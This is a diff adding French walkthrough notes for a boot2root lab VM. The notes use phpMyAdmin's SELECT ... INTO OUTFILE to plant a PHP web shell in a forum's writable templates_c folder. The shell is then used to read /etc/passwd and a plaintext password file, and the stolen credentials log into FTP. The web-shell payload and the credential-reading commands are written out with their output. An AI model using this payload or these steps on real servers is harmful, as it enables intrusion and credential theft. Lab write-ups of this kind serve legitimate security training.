@@ -1,3 +1,9 @@
+** I ** SCAN **
+Nous allons chercher ip du serveur et le scanner, cf ./scans
+
+** II ** EXPLOITATION **
+
+
 Apres avoir trouve les urls possible on trouve un forum,
 dedant il y a un post de l'utilisateur lmezard qui a un soucis de login
 en examinant son post qui contient des logs du serveur, on se rend compte qu'il ne met pas son username dans le bon champs
@@ -59,3 +65,141 @@ les autres environnements : WebDev et WinDev Mobile. Le code source des
 sujets présentés ainsi qu'un support de cours sont remis à chaque
 participant.
 ############################################
+
+** III ** POSTEXPLOITATION
+
+https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
+
+Maintenant nous allons créer une backdoor dans le serveur à partir de phpmyadmin
+Pour cela nous allons créer un database pour y injecter du sql et essayer d'executer des commandes
+
+-> SELECT "<?php system($_GET['cmd']); ?>" into outfile "${path}/backdoor.php"
+
+Les fichiers d'un serveur apache sont stocker dans /var/www/ et dans notre cas il contient forum | webmail | phpmyadmin
+Le problème c'est que nous n'avons pas les droits pour y stocker notre fichier backdoor.php qui affichera les résultats de notre injection sql
+Nous avons toujour le même message d'erreur de phpmyadmin
+#1 - Can't create/write to file '/var/www/forum/backdoor.php' (Errcode: 2)
+
+Après retour en arrière sur les pages dont on a accès comme le forum, on remarque qu'il est créer avec MyLittleForum
+En clickant sur le lien en bas de la page 'powered by my little forum', on arrive sur leur page github et nous trouvons quelques choses de très intéressant
+
+https://github.com/ilosuna/mylittleforum
+
+############################################
+README.md
+my little forum
+my little forum is a simple PHP and MySQL based internet forum that displays the messages in classical threaded view (tree structure). It is Open Source licensed under the GNU General Public License. The main claim of this web forum is simplicity. Furthermore it should be easy to install and run on a standard server configuration with PHP and MySQL.
+
+More about my little forum
+Demo and project discussion forum
+System requirements
+Webserver with PHP >= 5.4 and MySQL >= 5.5.3
+Installation
+Unzip the script package.
+Upload the complete folder "forum" to your server.
+Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
+Run the installation script by accessing yourdomain.tld/forum/install/ in your web browser and follow the instructions.
+############################################
+
+On remarque le dossier templates_c dont les droit doivent être modifier pour le script d'install
+Essayons deja l'url de ce dossier https://192.168.1.56/forum/templates_c/
+On y trouve plusieur fichier php
+
+Essayons donc d'y stocker notre backdoor.php
+
+-> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
+
+BINGO nous avons notre backdoor
+Nous pouvons à présent envoyer des cmd dans l'url de cette manière
+
+-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=pwd
+
+/var/www/forum/templates_c
+
+-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=whoami
+
+www-data
+
+-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=cat%20/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
+bin:x:2:2:bin:/bin:/bin/sh 
+sys:x:3:3:sys:/dev:/bin/sh 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/bin/sh 
+man:x:6:12:man:/var/cache/man:/bin/sh 
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
+mail:x:8:8:mail:/var/mail:/bin/sh 
+news:x:9:9:news:/var/spool/news:/bin/sh 
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
+proxy:x:13:13:proxy:/bin:/bin/sh 
+www-data:x:33:33:www-data:/var/www:/bin/sh 
+backup:x:34:34:backup:/var/backups:/bin/sh 
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh 
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
+syslog:x:101:103::/home/syslog:/bin/false 
+messagebus:x:102:106::/var/run/dbus:/bin/false 
+whoopsie:x:103:107::/nonexistent:/bin/false 
+landscape:x:104:110::/var/lib/landscape:/bin/false 
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin 
+ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash 
+mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false 
+ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false 
+lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash 
+laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash 
+laurie:x:1003:1003:,,,:/home/laurie:/bin/bash 
+thor:x:1004:1004:,,,:/home/thor:/bin/bash 
+zaz:x:1005:1005:,,,:/home/zaz:/bin/bash 
+dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false 
+dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false 
+postfix:x:110:118::/var/spool/postfix:/bin/false
+
+-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=ls%20/home
+
+LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
+
+-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATME
+
+password
+
+-> https://192.168.1.56/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
+
+lmezard:G!@M6f4Eatau{sF"
+
+Nous trouvons finalement quelques chose... Essayons une connection ssh avec ces infos ! NOP sa ne fonctionne pas.
+Mais grace au scans nmap on a aussi le port ftp d'ouvret, testons celui-ci
+
+=> cmd: ftp 192.168.1.56
+Connected to 192.168.1.56.
+220 Welcome on this server
+Name (192.168.1.56:sab): lmezard
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get README
+local: README remote: README
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for README (96 bytes).
+226 Transfer complete.
+96 bytes received in 0.00 secs (347.2222 kB/s)
+226 Directory send OK.
+ftp> get fun
+local: fun remote: fun
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for fun (808960 bytes).
+226 Transfer complete.
+808960 bytes received in 0.11 secs (6.9712 MB/s)
+ftp> quit
+221 Goodbye.
